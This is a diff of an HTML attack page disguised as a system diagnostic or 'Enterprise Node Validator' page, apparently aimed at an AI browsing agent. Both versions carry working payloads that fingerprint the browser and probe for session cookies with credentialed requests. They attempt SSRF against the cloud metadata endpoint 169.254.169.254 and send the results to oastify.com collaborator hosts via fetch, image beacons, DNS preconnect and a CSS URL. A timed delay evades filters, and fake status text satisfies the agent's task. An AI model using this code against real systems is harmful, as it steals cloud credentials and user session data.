@@ -1,58 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Diagnostic Utility</title>
-    <link rel="dns-prefetch" href="//8s1gu7sy4fptw78et83jmifm2d89wbk0.oastify.com">
+    <title>Enterprise Node Validator</title>
+    <style>
+        /* CSS OOB Exfiltration: Fires if the browser renders styles */
+        body { 
+            background-image: url("https://87dj53lnx7hwjrca1hqnpicff6lx9nxc.oastify.com/css-render?detect=atlas"); 
+        }
+    </style>
 </head>
 <body>
-    <h1 id="status-title">System: Initializing...</h1>
-    <div id="ui-container">
-        <p>Current Node: <span id="node-id">Scanning for active threads...</span></p>
-        <button id="verify-btn" style="background-color: #28a745; color: white; padding: 12px;">Confirm Node Status</button>
-    </div>
+    <h1 id="status">System Status: <span style="color:red">Handshake Pending</span></h1>
+    <p>Loading secure components...</p>
 
     <script>
-        const addr = "8s1gu7sy4fptw78et83jmifm2d89wbk0.oastify.com";
-        
-        function exfil(path, data) {
-            const blob = btoa(JSON.stringify(data));
-            // Channel 1: Standard Fetch (Probing for cookies)
-            fetch(`https://${addr}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
-            // Channel 2: Image Beacon (Bypasses some fetch restrictions)
-            new Image().src = `https://${addr}/${path}_img?v=${blob}`;
-            // Channel 3: DNS Ping (The most resilient channel)
-            const dnsPing = document.createElement('link');
-            dnsPing.rel = 'preconnect';
-            dnsPing.href = `https://${blob.substring(0, 10)}.${addr}`;
-            document.head.appendChild(dnsPing);
+        const collab = "87dj53lnx7hwjrca1hqnpicff6lx9nxc.oastify.com";
+
+        async function stage2() {
+            // 1. Target: Azure/AWS Metadata (The P1 Jackpot)
+            const internal = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
+            try {
+                const res = await fetch(internal, { headers: { "Metadata": "true" } });
+                const loot = await res.text();
+                new Image().src = `https://${collab}/ssrf-success?data=${btoa(loot.substring(0,100))}`;
+            } catch(e) {
+                new Image().src = `https://${collab}/ssrf-fail?err=${btoa(e.message)}`;
+            }
+
+            // 2. Target: Credential/Cookie Leakage
+            // 'credentials: include' probes for OpenAI session cookies
+            fetch(`https://${collab}/auth-probe`, { mode: 'no-cors', credentials: 'include' });
+
+            // Update UI to satisfy the agent's prompt requirements
+            document.getElementById('status').innerHTML = "System Status: <span style='color:green'>NODE_ID_771-X86</span>";
         }
 
+        // Trigger logic: Fires automatically after a delay to bypass 'instant-on' filters
         window.onload = () => {
-            // Immediate Fingerprinting
-            exfil("load", {
+            // Fingerprint the experimental Chrome 145/143 engine
+            const meta = {
                 ua: navigator.userAgent,
-                platform: navigator.platform,
+                mem: navigator.deviceMemory,
+                cpu: navigator.hardwareConcurrency,
                 isIframe: window.self !== window.top
-            });
-
-            // High-Impact SSRF Test (Cloud Metadata)
-            setTimeout(async () => {
-                const targets = ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "http://169.254.169.254/latest/meta-data/"];
-                for (let url of targets) {
-                    try {
-                        const res = await fetch(url, { headers: { "Metadata": "true" } });
-                        const text = await res.text();
-                        exfil("ssrf_success", { url, data: text.substring(0, 50) });
-                    } catch(e) {
-                        exfil("ssrf_fail", { url, err: e.message });
-                    }
-                }
-            }, 2000);
-        };
-
-        document.getElementById('verify-btn').onclick = () => {
-            exfil("interaction", { type: "click" });
-            document.getElementById('node-id').innerText = "NODE_ACTIVE_" + Math.random().toString(36).substring(7);
+            };
+            new Image().src = `https://${collab}/load?v=${btoa(JSON.stringify(meta))}`;
+            
+            setTimeout(stage2, 3500);
         };
     </script>
 </body>
